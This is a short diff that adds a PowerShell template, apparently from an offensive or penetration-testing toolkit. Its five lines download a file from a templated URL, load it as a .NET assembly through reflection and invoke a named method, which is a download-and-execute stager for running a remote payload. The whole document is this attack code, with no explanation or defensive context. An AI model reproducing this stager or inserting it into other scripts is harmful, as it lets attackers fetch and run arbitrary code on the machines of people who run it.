@@ -1,0 +1,5 @@
+(new-object system.net.webclient).DownloadFile("[[[[downloadFrom]]]]",'[[[[saveAs]]]]')
+$assem = [system.reflection.assembly]::loadfile('[[[[saveAs]]]]')
+$class = $assem.gettype("[[[[assemblyName]]]]")
+$method = $class.GetMethod("[[[[methodName]]]]")
+$method.invoke(0,$null)
